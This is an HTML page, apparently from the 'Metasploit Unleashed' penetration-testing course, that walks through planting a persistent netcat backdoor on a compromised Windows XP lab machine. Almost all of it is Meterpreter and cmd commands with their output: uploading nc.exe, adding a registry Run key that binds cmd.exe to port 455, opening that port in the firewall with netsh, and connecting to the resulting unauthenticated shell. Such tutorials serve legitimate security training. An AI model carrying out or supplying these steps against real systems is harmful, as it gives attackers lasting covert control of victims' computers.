<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Persistent Netcat Backdoor</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Persistent
Netcat Backdoor</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">In this example, instead of looking up
information on the remote
system, we will be installing a netcat backdoor. This includes changes
to the system registry and firewall.
</p>
<p style="color: rgb(0, 0, 0);">First, we must upload a copy of netcat
to the remote system.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; upload /tmp/nc.exe C:\\windows\\system32<br>[*] uploading  : /tmp/nc.exe -&gt; C:\windows\system32<br>[*] uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Afterwards, we work with the
registry to have netcat execute on
start up and listen on port 455. We do this by editing the key
'HKLM\software\microsoft\windows\currentversion\run'.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run<br>Enumerating: HKLM\software\microsoft\windows\currentversion\run<br><br>  Values (3):<br><br>    VMware Tools<br>    VMware User Process<br>    quicktftpserver<br><br><u>meterpreter</u> &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d "C:\windows\system32\nc.exe -Ldp 455 -e cmd.exe"<br>Successful set nc.<br><u>meterpreter</u> &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc<br>Key: HKLM\software\microsoft\windows\currentversion\Run<br>Name: nc<br>Type: REG_SZ<br>Data: C:\windows\system32\nc.exe -Ldp 455 -e cmd.exe</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Next, we need to alter the system to
allow remote connections
through the firewall to our netcat backdoor. We open up an interactive
command prompt and use the 'netsh' command to make the changes as it is
far less error prone than altering the registry directly. Plus, the
process shown should work across more versions of Windows, as registry
locations and functions are highly version and patch level dependent.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; execute -f cmd -i<br>Process 1604 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Jim\My Documents&gt; netsh firewall show opmode<br>Netsh firewall show opmode<br><br>Domain profile configuration:<br>-------------------------------------------------------------------<br>Operational mode                  = Enable<br>Exception mode                    = Enable<br><br>Standard profile configuration (current):<br>-------------------------------------------------------------------<br>Operational mode                  = Enable<br>Exception mode                    = Enable<br><br>Local Area Connection firewall configuration:<br>-------------------------------------------------------------------<br>Operational mode                  = Enable</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We open up port 445 in the firewall
and double-check that it was set properly.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">C:\Documents and Settings\Jim\My Documents&gt; netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL<br>netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL<br>Ok.<br><br>C:\Documents and Settings\Jim\My Documents&gt; netsh firewall show portopening<br>netsh firewall show portopening<br><br>Port configuration for Domain profile:<br>Port   Protocol  Mode     Name<br>-------------------------------------------------------------------<br>139    TCP       Enable   NetBIOS Session Service<br>445    TCP       Enable   SMB over TCP<br>137    UDP       Enable   NetBIOS Name Service<br>138    UDP       Enable   NetBIOS Datagram Service<br><br>Port configuration for Standard profile:<br>Port   Protocol  Mode     Name<br>-------------------------------------------------------------------<br>455    TCP       Enable   Service Firewall<br>139    TCP       Enable   NetBIOS Session Service<br>445    TCP       Enable   SMB over TCP<br>137    UDP       Enable   NetBIOS Name Service<br>138    UDP       Enable   NetBIOS Datagram Service<br><br><br>C:\Documents and Settings\Jim\My Documents&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">So with that being completed, we
will reboot the remote system and test out the netcat shell.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# nc -v 172.16.104.128 455<br>172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out<br>(UNKNOWN) [172.16.104.128] 455 (?) open<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Jim&gt; dir<br>dir<br>Volume in drive C has no label.<br>Volume Serial Number is E423-E726<br><br>Directory of C:\Documents and Settings\Jim<br><br>05/03/2009 01:43 AM<br>.<br>05/03/2009 01:43 AM<br>..<br>05/03/2009 01:26 AM 0 ;i<br>05/12/2009 10:53 PM<br>Desktop<br>10/29/2008 05:55 PM<br>Favorites<br>05/12/2009 10:53 PM<br>My Documents<br>05/03/2009 01:43 AM 0 QCY<br>10/29/2008 03:51 AM<br>Start Menu<br>05/03/2009 01:25 AM 0 talltelnet.log<br>05/03/2009 01:25 AM 0 talltftp.log<br>4 File(s) 0 bytes<br>6 Dir(s) 35,540,791,296 bytes free<br><br>C:\Documents and Settings\Jim&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Wonderful! In a real world
situation, we would not be using such a
simple backdoor as this, with no authentication or encryption, however
the principles of this process remain the same for other changes to the
system, and other sorts of programs one might want to execute on start
up. </span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Interacting_With_The_Registry"
 title="Interacting With The Registry">Interacting with the Registry</a></div>
</body>
</html>
